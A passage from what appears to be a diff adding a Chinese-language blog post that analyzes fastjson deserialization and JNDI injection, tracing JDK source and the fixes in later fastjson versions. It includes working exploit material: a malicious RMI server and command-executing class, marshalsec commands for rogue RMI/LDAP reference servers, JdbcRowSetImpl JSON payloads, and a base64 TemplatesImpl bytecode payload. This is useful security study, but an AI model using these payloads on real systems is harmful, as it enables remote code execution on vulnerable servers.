env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        System.getProperties().setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">        System.getProperties().setProperty(<span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Server:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>EvilClass:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>版本问题：</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404220349806.png" alt="image-20200404220349806"></p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404220558086.png" alt="image-20200404220558086"></p>
+<p>为什么会造成命令执行？答案在Client的lookup方法中</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404221455933.png" alt="image-20200404221455933"></p>
+<p>跟进后发现是接口，<code>command+option+B</code>查找实现，可以从报错的调用栈打印看到具体的实现类是哪一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; javax.naming.NamingException [Root exception is java.lang.ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory]</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br><span class="line">	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">	at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">	at Client.main(Client.java:9)</span><br><span class="line">Caused by: java.lang.ClassCastException: ExecTest cannot be cast to javax.naming.spi.ObjectFactory</span><br><span class="line">	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)</span><br><span class="line">	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:319)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)</span><br><span class="line">	... 4 more</span><br></pre></td></tr></table></figure>
+
+<p>最终发现在<code>com/sun/jndi/rmi/registry/RegistryContext.java</code>中的<code>decodeObject</code>中有创建实例的操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进到<code>getObjectInstance</code>方法，这里代码执行的点有两处</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NamingManager.class</span></span><br><span class="line"><span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String f = ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">              	<span class="comment">// 代码执行，构造器和静态方法会被执行</span></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  	<span class="comment">// 代码执行，当复写getObjectInstance方法时这里会执行</span></span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">                <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">                answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">                <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> answer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200404232052152.png" alt="image-20200404232052152"></p>
+<p>JNDI的一个特性是协议动态转换，即使client在初始化时使用的上下文环境为RMI，在lookup方法中传入LDAP协议的URI也能支持，程序会自动切换到LDAP的上下文中。</p>
+<p>可以使用<code>marshalsec</code>工具快速开启RMI/LDAP服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// client</span></span><br><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        System.getProperties().setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">        System.getProperties().setProperty(<span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">        String uri = <span class="string">"ldap://localhost:1389/obj"</span>;</span><br><span class="line"><span class="comment">//        String uri = "rmi://127.0.0.1:1389/aa";</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        ctx.lookup(uri);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// hacker marshalsec service</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/\<span class="comment">#ExecTest</span></span><br><span class="line">Listening on 0.0.0.0:1389</span><br><span class="line">Send LDAP reference result <span class="keyword">for</span> obj redirecting to http://127.0.0.1:8081/ExecTest.class</span><br></pre></td></tr></table></figure>
+
+<p>该命令会在1389端口开启LDAP，在client查询<code>ldap://localhost:1389/obj</code>时返回<code>http://127.0.0.1:8081/ExecTest.class</code></p>
+<h3 id="RMI-Remote-Object-Payload"><a href="#RMI-Remote-Object-Payload" class="headerlink" title="RMI Remote Object Payload"></a>RMI Remote Object Payload</h3><p>kingx提到攻击者可以实现一个RMI恶意远程对象并绑定到RMI Registry上，如果client在反序列化时发现一个对象，则先会到CLASSPATH寻找相应的类，如果找不到类定义时会根据codebase去下载这个类的class，然后动态加载。（以下一段摘自<a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">这里</a>）</p>
+<p>这种方式局限很大，因此并不是很常见，限制条件为：</p>
+<ol>
+<li>安装并配置了SecurityManager</li>
+<li>Java版本低于7u21, 6u45或者设置了java.rmi.server.useCodebaseOnly=false</li>
+</ol>
+<p>实验一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server的远程接口</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="RMI-JNDI-Reference-Payload"><a href="#RMI-JNDI-Reference-Payload" class="headerlink" title="RMI JNDI Reference Payload"></a>RMI JNDI Reference Payload</h3><p>使用marshalsec开启RMI服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8081/\<span class="comment">#ExecTest</span></span><br></pre></td></tr></table></figure>
+
+<p>Payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/ExexTest"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>RMI和LDAP的利用类是com.sun.rowset.JdbcRowSetImpl，刚才已经提到过，在设置<code>autoCommit</code>属性并进行反序列化时，fastjson会调用其setter方法<code>setAutoCommit</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">            <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会触发<code>this.connect()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进<code>lookup()</code>方法，后续代码会根据传入URI的scheme判断使用何种上下文环境继续解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">            <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">        &#125;</span><br><span class="line">        String scheme = getURLScheme(name);</span><br><span class="line">        <span class="keyword">if</span> (scheme != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Context ctx = NamingManager.getURLContext(scheme, myProps);</span><br><span class="line">            <span class="keyword">if</span> (ctx != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ctx;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于传入的是RMI协议，继续解析的过程到达<code>com/sun/jndi/toolkit/url/GenericURLContext.class</code>，这样就形成了JNDI注入</p>
+<h3 id="LDAP-JNDI-Reference-Payload"><a href="#LDAP-JNDI-Reference-Payload" class="headerlink" title="LDAP JNDI Reference Payload"></a>LDAP JNDI Reference Payload</h3><p>使用marshalsec开启LDAP服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/\#ExecTest</span><br></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个利用方案与RMI相同，由于JNDI有动态协议切换的特性，所以我们传入LDAP协议的payload也是可以的。而且ldap的适用性更广，放一张2016年的blackhat演讲，LDAP在</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200405134201277.png" alt="image-20200405134201277"></p>
+<h3 id="插曲：JDK版本对RMI和LDAP的限制"><a href="#插曲：JDK版本对RMI和LDAP的限制" class="headerlink" title="插曲：JDK版本对RMI和LDAP的限制"></a>插曲：JDK版本对RMI和LDAP的限制</h3><p>From <a href="[https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/](https://www.smi1e.top/java代码审计学习之jndi注入/)">smi1e</a></p>
+<blockquote>
+<p>在<code>JDK 6u132</code>, <code>JDK 7u122</code>, <code>JDK 8u113</code> 中JNDI 限制了<code>Naming/Directory</code>服务中<code>JNDI Reference</code>远程加载<code>Object Factory</code>类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为<code>false</code>，即默认不允许从远程的<code>Codebase</code>加载<code>Reference</code>工厂类。</p>
+<p>LDAP服务的Reference远程加载Factory类不受上一点中<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在<code>Oracle JDK</code> <code>11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为<code>false</code></p>
+</blockquote>
+<h3 id="RMI-BeanFactory"><a href="#RMI-BeanFactory" class="headerlink" title="RMI BeanFactory"></a>RMI BeanFactory</h3><p>RMI禁用了远程加载类后，新的POC模式出现了，使用RMI+本地加载类的方式进行绕过，例如BeanFactory类.</p>
+<p>当服务端使用了高版本的JDK（9u191以上版本），默认状态下不能在远程加载恶意的Factory，但如果在本地有能够利用的Factory就依然可以走<code>getObjectInstance()</code>的分支实现命令执行</p>
+<p>一个满足条件并且被广泛使用的类是<code>org.apache.naming.factory.BeanFactory</code>，在Tomcat的依赖包中。</p>
+<p>实际的利用过程是，首先恶意的RMI-Server需要绑定一个ResourceRef来封装工厂类，当客户端lookup操作获取到对象后，会先判断是否是Reference类型</p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200410220355915.png" alt="image-20200410220355915"></p>
+<p>如果是Reference会使用getObjectFactoryFromReference方法获取工厂类，然后调用factory.getObjectInstance方法进行实例化。这里获取到的工厂类就是BeanFactory</p>
+<h3 id="LDAP-Java-Serialized-Data"><a href="#LDAP-Java-Serialized-Data" class="headerlink" title="LDAP Java Serialized Data"></a>LDAP Java Serialized Data</h3><h3 id="POC5：特殊类com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><a href="#POC5：特殊类com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="POC5：特殊类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>POC5：特殊类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload</span></span><br><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1McGVyc29uL1Rlc3Q7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACAAJBwAvDAAwADEBAD0vU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yDAAyADMBAAtwZXJzb24vVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAVAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAAB0ACAAeAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk"],'_name':'a.b','_tfactory':&#123; &#125;,"_outputProperties":&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl</code>类实现的命令执行</p>
+<h2 id="fastjson-1-2-25修复"><a href="#fastjson-1-2-25修复" class="headerlink" title="fastjson 1.2.25修复"></a>fastjson 1.2.25修复</h2><p><a href="https://github.com/alibaba/fastjson/compare/1.2.24...1.2.25" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/compare/1.2.24...1.2.25</a></p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200410234925624.png" alt="image-20200410234925624"></p>
+<h2 id="fastjson-1-2-42修复"><a href="#fastjson-1-2-42修复" class="headerlink" title="fastjson 1.2.42修复"></a>fastjson 1.2.42修复</h2><p><a href="https://github.com/alibaba/fastjson/compare/1.2.25...1.2.42" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/compare/1.2.25...1.2.42</a></p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200411001638162.png" alt="image-20200411001638162"></p>
+<p><img src="/2020/04/04/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200411002000317.png" alt="image-20200411002000317"></p>
